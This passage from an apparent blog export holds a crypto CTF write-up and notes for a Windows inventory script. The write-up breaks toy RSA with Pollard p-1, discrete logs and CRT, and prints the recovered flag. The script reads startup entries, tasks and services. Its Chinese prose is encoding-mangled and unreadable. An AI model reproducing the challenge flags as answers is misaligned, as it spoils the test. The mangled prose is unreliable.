class="number">488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line">c_2 = <span class="number">109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ç›´æ¥å¥— Pollard&#x27;s p-1ç®—æ³• é€šè¿‡c_1 æ±‚å‡º p q</span></span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = powmod(a, n, N)</span><br><span class="line">    res = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>, res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>, q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d = invert(e, (res - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c_1, d, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># p= 83408372012221120677052349409462320990177094246143674474872152829440524098582262384066400107950985845255268335597502228206679771838750219696329523257176739436871327238322817403970284015587320158034304282786944710043150568360761457471641695390427267786485448748458445872307883254297662715749746270343116946519</span></span><br><span class="line"><span class="comment"># q= 84761154786085445040051273337185621770653977624442810400422736258693219544281946893222923335092616440575888204882883202879374137962201839964482318483860286412488851522612902055732831909496637360268825720155284438779235801463340052531340653630637729255285872455686692027630814695155220888112228977346697309127</span></span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s_&#x27;</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>c_1 = pow(m_1, e, n)</p>
<p>c_2 = pow(e, m_2, n)</p>
<p>c2 = e^ m_2  mod n     e^m2 = c2 + k*n</p>
<p>c2 e n éƒ½å·²çŸ¥ æ±‚m2</p>
<p>m2 = loge(c2)</p>
<p>åˆ©ç”¨sage   </p>
<p>GFp = GF(p)  # æœ‰é™åŸŸ</p>
<p> log(GFp(c_2), e)</p>
</blockquote>
<p>ç¦»æ•£å¯¹æ•° Pohlig-Hellmanç®—æ³•æ±‚m2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">7069789930583271525053215046247773438899869283661158227309691853515987055334306019600324056376312479212090202373516405860759222837585952590589336295698718699890424169542280710721069784487366121478569760563045886361884895363592898476736269784284754788133722060718026577238640218755539268465317292713320841554802703379684173485217045274942603346947299152498798736808975912326592689302969859834957202716983626393365387411319175917999258829839695189774082810459527737342402920881184864625678296442001837072332161966439361793009893108796934406114288057583563496587655548536011677451960307597573257032154009427010069578913</span></span><br><span class="line">c_1 = <span class="number">488692928085934899944055554857568564903346089951134051486941368561567330884363274156339625953702601270565654444836193796061118053575538224794730472032345171432952984560662218697488844007827176184413713651118743456250147472678673801728916283759932987216388378211555067885210167894310696549664382751443669387953644382833924884208966436685137553434532738845959014828804809425096115758364136546390809453200055265653531950423111482644330073443545410319576097902472017235065047191133112557289289189187696092145850680765843608118584107829268136014912479701945735063525799796920293418182776436767911172221104640501952880057</span></span><br><span class="line">c_2 = <span class="number">109770827223661560471527567179288748906402603483328748683689436879660543465776899146036833470531024202351087008847594392666852763100570391337823820240726499421306887565697452868723849092658743267256316770223643723095601213088336064635680075206929620159782416078143076506249031972043819429093074684182845530529249907297736582589125917235222921623698038868900282049587768700860009877737045693722732170123306528145661683416808514556360429554775212088169626620488741903267154641722293484797745665402402381445609873333905772582972140944493849645600529147490903067975300304532955461710562911203871840101407995813072692212</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">83408372012221120677052349409462320990177094246143674474872152829440524098582262384066400107950985845255268335597502228206679771838750219696329523257176739436871327238322817403970284015587320158034304282786944710043150568360761457471641695390427267786485448748458445872307883254297662715749746270343116946519</span></span><br><span class="line">q = n // p</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)//GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)</span><br><span class="line">d1 = <span class="built_in">int</span>(inverse(e, phi))</span><br><span class="line"></span><br><span class="line">m1 = <span class="built_in">int</span>(<span class="built_in">pow</span>(<span class="built_in">int</span>(c_1), d1,n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®šä¹‰æœ‰é™åŸŸ GF(p) GF(q)</span></span><br><span class="line">Fp = GF(p)</span><br><span class="line">Fq = GF(q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># c2 e è½¬æ¢ä¸º GF()ä¸­çš„å…ƒç´ </span></span><br><span class="line">c2p = Fp(c_2)</span><br><span class="line">c2q = Fq(c_2)</span><br><span class="line">ep = Fp(e)</span><br><span class="line">eq = Fq(e)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¡ç®— loge(c2)</span></span><br><span class="line">dp = discrete_log(c2p, ep)</span><br><span class="line">dq = discrete_log(c2q, eq)</span><br><span class="line"><span class="comment"># ä¸­å›½å‰©ä½™å®šç†CRT è®¡ç®— æ»¡è¶³ m^e = c2 mod n çš„ mçš„å€¼</span></span><br><span class="line">m2 = <span class="built_in">int</span>(crt([dp,dq],[p-<span class="number">1</span>,q-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">m = long_to_bytes(m1) + long_to_bytes(m2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s_&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;_s1lK__Ri9H7?!&#125;&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;CCTF&#123;5L3Ek_4s__s1lK__Ri9H7?!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<h3 id="p-1å…‰æ»‘-1"><a href="#p-1å…‰æ»‘-1" class="headerlink" title="p+1å…‰æ»‘"></a>p+1å…‰æ»‘</h3><h4 id="Williamsâ€™s-p-1ç®—æ³•"><a href="#Williamsâ€™s-p-1ç®—æ³•" class="headerlink" title="Williamsâ€™s p+1ç®—æ³•"></a>Williamsâ€™s p+1ç®—æ³•</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">mlucas</span>(<span class="params">v, a, n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Helper function for williams_pp1().  Multiplies along a Lucas sequence modulo n. &quot;&quot;&quot;</span></span><br><span class="line">    v1, v2 = v, (v**<span class="number">2</span> - <span class="number">2</span>) % n</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">bin</span>(a)[<span class="number">3</span>:]: v1, v2 = ((v1**<span class="number">2</span> - <span class="number">2</span>) % n, (v1*v2 - v) % n) <span class="keyword">if</span> bit == <span class="string">&quot;0&quot;</span> <span class="keyword">else</span> ((v1*v2 - v) % n, (v2**<span class="number">2</span> - <span class="number">2</span>) % n)</span><br><span class="line">    <span class="keyword">return</span> v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> count(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> primegen():</span><br><span class="line">        e = ilog(isqrt(n), p)</span><br><span class="line">        <span class="keyword">if</span> e == <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(e): v = mlucas(v, p, n)</span><br><span class="line">        g = gcd(v-<span class="number">2</span>, n)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; g &lt; n: <span class="keyword">return</span> g <span class="comment"># g|n</span></span><br><span class="line">        <span class="keyword">if</span> g == n: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>





<h3 id="ç»¼åˆä¾‹é¢˜"><a href="#ç»¼åˆä¾‹é¢˜" class="headerlink" title="ç»¼åˆä¾‹é¢˜"></a>ç»¼åˆä¾‹é¢˜</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gmpy2.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gmpy2.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_prime_2</span>(<span class="params">digit</span>):</span><br><span class="line">    primes = []</span><br><span class="line">    pri = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(primes)&lt;<span class="number">100</span>):</span><br><span class="line">        pri = gmpy2.next_prime(pri)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(pri))</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> count &lt; <span class="number">2</span>**digit:</span><br><span class="line">            count *= random.choice(primes)</span><br><span class="line">        count -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(gmpy2.is_prime(count)):</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">start, modulus, a, b, c, d</span>):</span><br><span class="line">    arr = []</span><br><span class="line">    arr.append(start)</span><br><span class="line">    arr.append(start+<span class="number">1</span>)</span><br><span class="line">    arr.append(start+<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">100</span>):</span><br><span class="line">        arr.append((a * arr[-<span class="number">3</span>] + b * arr[-<span class="number">2</span>] + c * arr[-<span class="number">1</span>] + d) % modulus)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line"></span><br><span class="line">p1 = gen_prime(<span class="number">256</span>)</span><br><span class="line">q1 = getPrime(<span class="number">256</span>)</span><br><span class="line">p2 = gen_prime_2(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span> p1 &gt; q1</span><br><span class="line"><span class="keyword">assert</span> p2 &gt; q2</span><br><span class="line">n1 = p1 * q1</span><br><span class="line">n2 = p2 * q2</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n1 = %s&quot;</span> % <span class="built_in">str</span>(n1)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;n2 = %s&quot;</span> % <span class="built_in">str</span>(n2)</span><br><span class="line"></span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;r = %s&quot;</span> % <span class="built_in">str</span>(r)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx&#125;&quot;</span></span><br><span class="line">m = s2n(flag)</span><br><span class="line"></span><br><span class="line">arr = generate(m, r, p1, q1, p2, q2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100] = %s&quot;</span> % <span class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100+1] = %s&quot;</span> % <span class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>+<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;arr[10**100+2] = %s&quot;</span> % <span class="built_in">str</span>(arr[<span class="number">10</span>**<span class="number">100</span>+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 = 1122627862697321019530282965736391850755580895936802291161309915792429961624747356094273651528053737694375752383507509008511083571424513544351844231796981247</span></span><br><span class="line"><span class="comment"># n2 = 42452228756074949430200119187674072800166259263276225653674599426683428744745000585507174701894408343398957593869403921976682474759688236534918012868451437</span></span><br><span class="line"><span class="comment"># r = 12562551311997602982227662257453842057851021749009292708783465660065261139703971906109320639580310598023202634257624805719964182261882169860035285540999137</span></span><br><span class="line"><span class="comment"># arr[10**100] = 4838353389408955215917845462224851356983185785715321739245030612236910363177888113470205298612968999913978808363082599570155255107799227941046736259627961</span></span><br><span class="line"><span class="comment"># arr[10**100+1] = 10699223576890057648654189340104320126576219437282628103579325446469238279292850193524138389756436672641376651989022132710127197616146958216805814995598472</span></span><br><span class="line"><span class="comment"># arr[10**100+2] = 10255743354332378416989087696439685123717830836779737961024112448965245238772080092701344614830923313888435306261206177140560579750917219609679498132161402</span></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>WP</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/m0_51507437/article/details/124205732">https://blog.csdn.net/m0_51507437/article/details/124205732</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsä¸»æœºèµ„äº§ä¿¡æ¯æ”¶é›†è„šæœ¬</title>
    <url>/posts/d50c9f22/</url>
    <content><![CDATA[<h3 id="æ”¶é›†å†…å®¹-amp-amp-å®ç°æ€è·¯"><a href="#æ”¶é›†å†…å®¹-amp-amp-å®ç°æ€è·¯" class="headerlink" title="æ”¶é›†å†…å®¹&amp;&amp;å®ç°æ€è·¯"></a>æ”¶é›†å†…å®¹&amp;&amp;å®ç°æ€è·¯</h3><p>ç³»ç»Ÿä¿¡æ¯[OSã€IP ã€è¡¥ä¸ä¿¡æ¯]ã€å¼€æ”¾ç«¯å£ã€æœåŠ¡ã€è®¡åˆ’ä»»åŠ¡ã€è‡ªå¯åŠ¨é¡¹ã€å®‰è£…åº”ç”¨</p>
<h4 id="ç³»ç»Ÿä¿¡æ¯"><a href="#ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="ç³»ç»Ÿä¿¡æ¯"></a>ç³»ç»Ÿä¿¡æ¯</h4><p>é€šè¿‡è°ƒç”¨Powershellè·å–ä¸»æœºç¯å¢ƒä¿¡æ¯ã€ä¸èƒ½ç”¨wmic å› ä¸ºwmicå¯èƒ½éœ€è¦é«˜æƒé™ã€‘</p>
<h4 id="å¼€æ”¾ç«¯å£"><a href="#å¼€æ”¾ç«¯å£" class="headerlink" title="å¼€æ”¾ç«¯å£"></a>å¼€æ”¾ç«¯å£</h4><p>netstat -ano è¿‡æ»¤å‡º Listening æˆ– Establishedçš„ä¿¡æ¯</p>
<p>æš‚æ—¶è¿˜ä¸çŸ¥é“æ€ä¹ˆå»ä¼˜åŒ– åç»­çœ‹æƒ…å†µè°ƒæ•´</p>
<h4 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h4><p>é€šè¿‡wmiè·å–ä¸»æœºä¸­æ‰€æœ‰æœåŠ¡[running/stop]</p>
<h4 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h4><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree ä¸‹å­˜åœ¨ç€å„ç§è®¡åˆ’ä»»åŠ¡</p>
<p>ä½†æ˜¯å¥½åƒæ²¡æ³•ç”¨pythonå»è¯»ã€æˆ–è®¸æ˜¯è™šè¡¨ æ²¡æ³•è¯»ã€‘</p>
<p>æ‰€ä»¥è€ƒè™‘ä½¿ç”¨COMæ¥å£å»è¯·æ±‚ Schedule.Service ï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•åªèƒ½è·å–éƒ¨åˆ†è®¡åˆ’ä»»åŠ¡ï¼Œä¸å®Œæ•´</p>
<h4 id="è‡ªå¯åŠ¨é¡¹"><a href="#è‡ªå¯åŠ¨é¡¹" class="headerlink" title="è‡ªå¯åŠ¨é¡¹"></a>è‡ªå¯åŠ¨é¡¹</h4><p># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
<p># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</p>
<p># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</p>
<h4 id="å®‰è£…åº”ç”¨"><a href="#å®‰è£…åº”ç”¨" class="headerlink" title="å®‰è£…åº”ç”¨"></a>å®‰è£…åº”ç”¨</h4><p># åˆ—å‡º HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</p>
<p># åˆ—å‡º HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall ä¸‹çš„å­é¡¹åŠå…¶ DisplayName å€¼</p>
<h3 id="ç¯å¢ƒå®‰è£…é—®é¢˜"><a href="#ç¯å¢ƒå®‰è£…é—®é¢˜" class="headerlink" title="ç¯å¢ƒå®‰è£…é—®é¢˜"></a>ç¯å¢ƒå®‰è£…é—®é¢˜</h3><p>å¯é€šè¿‡python3 è°ƒç”¨å‘½ä»¤è¡Œæˆ–æŸ¥æ³¨å†Œè¡¨é”®å€¼å¯¹è·å–ç›¸å…³ä¿¡æ¯</p>
<p>åœ¨win2003ä¸­æ²¡æœ‰Powershellç¯å¢ƒ è¦ç”¨py3æˆ–è€…batè„šæœ¬å»è·å–ä¿¡æ¯ã€ä½†æ˜¯win2003æ”¯æŒpythonç‰ˆæœ¬æœ€é«˜ä½python3.4 ç¯å¢ƒå®‰è£…æœ‰é—®é¢˜ã€‘</p>
<p>éœ€è¦æå‰å®‰è£…ç›¸å…³åº“</p>
<p>pip install wmi</p>
<p>pip install pypiwin32</p>
<p>win10 win7 win2008 win2012 win2016æµ‹è¯•ä¸‹è„šæœ¬å‡å¯è¡Œ</p>
<p>win2012ä¸‹ å®‰è£…python3.7.0 åã€é€‰æ‹©æ·»åŠ ç¯å¢ƒå˜é‡ å®‰è£…åè‡ªå¸¦pipã€‘ å¯ç›´æ¥ä½¿ç”¨æ‰“åŒ…å¥½çš„exe</p>
<p>è¿è¡Œè„šæœ¬ ç¼ºå°‘ vcruntime  ä½†æ˜¯åœ¨å®‰è£…runtimeæ—¶æŠ¥é”™éœ€è¦ä¸‹è½½å‰ç½®è¡¥ä¸ ã€è§£å†³å‚è€ƒ<a href="https://blog.csdn.net/blog_user_zk/article/details/111040113%E3%80%91">https://blog.csdn.net/blog_user_zk/article/details/111040113ã€‘</a></p>
<p>ä¾æ¬¡å®‰è£… <a href="https://www.microsoft.com/en-us/download/details.aspx?id=42365">KB2939087</a> <a href="https://www.microsoft.com/en-us/download/details.aspx?id=43531">KB2975061</a> <a href="https://www.microsoft.com/zh-cn/download/details.aspx?id=42334">KB2919355</a> å†å®‰è£…VCRuntimeå³å¯</p>
<p>win2008 pythonå¯ç”¨3.7.0ç¼ºå°‘ VCRUNTIME140_1.dll â€¦ éœ€è¦å®‰è£…runtime  <a href="https://aka.ms/vs/17/release/vc_redist.x64.exe">https://aka.ms/vs/17/release/vc_redist.x64.exe</a></p>
<p>win2003 python3.3.5ã€<a href="http://www.python.org/ftp/python/3.3.5/python-3.3.5.msi%E3%80%91">http://www.python.org/ftp/python/3.3.5/python-3.3.5.msiã€‘</a> è¯­æ³•ä¸æ”¯æŒ fç›¸å…³ æ‰€ä»¥éœ€è¦å…¨æ”¹æˆformat</p>
<p>win2003 pipå®‰è£…æœ‰é—®é¢˜ è¿˜æ²¡è§£å†³ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
<p>æ¢ç‰ˆæœ¬ <a href="https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi">https://www.python.org/ftp/python/3.4.4/python-3.4.4.msi</a> æ¢æˆpython3.4.4 è‡ªå¸¦pip</p>
<p>ä½†æ˜¯æ›´æ–°pip åå°†ä¸å¯ç”¨â€¦. </p>
<p>pip install pypiwin32,wmi éƒ½ä¸è¡Œ ç‰ˆæœ¬è¿‡ä½ æ‰€ä»¥ä¸å¯ç”¨ã€‚ ã€pypiwin32åªæ”¯æŒpython3.5+ã€‘</p>
<h3 id="Version1"><a href="#Version1" class="headerlink" title="Version1"></a>Version1</h3><h4 id="Python3ä»£ç "><a href="#Python3ä»£ç " class="headerlink" title="Python3ä»£ç "></a>Python3ä»£ç </h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> win32com.client</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> wmi</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># åˆ°è¾¾æ³¨å†Œè¡¨æœ«å°¾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># è¯»å– HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°è‡ªå¯åŠ¨é¡¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;title&#125;</span>:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Name: <span class="subst">&#123;name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="comment"># print(f&quot;Path: &#123;value&#125;&quot;)</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(f&quot;&#123;title&#125; is empty.\n&quot;)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_task_scheduler</span>():</span><br><span class="line">    scheduler = win32com.client.Dispatch(<span class="string">&#x27;Schedule.Service&#x27;</span>)</span><br><span class="line">    scheduler.Connect()</span><br><span class="line">    rootFolder = scheduler.GetFolder(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> rootFolder</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_tasks_info</span>(<span class="params">root_folder</span>):</span><br><span class="line">    <span class="keyword">for</span> task <span class="keyword">in</span> root_folder.GetTasks(<span class="number">0</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Task Name: <span class="subst">&#123;task.Name&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Next Run Time: <span class="subst">&#123;task.NextRunTime&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;State: <span class="subst">&#123;task.State&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_services</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        c = wmi.WMI()</span><br><span class="line">        services = c.Win32_Service()</span><br><span class="line">        <span class="keyword">return</span> services</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, 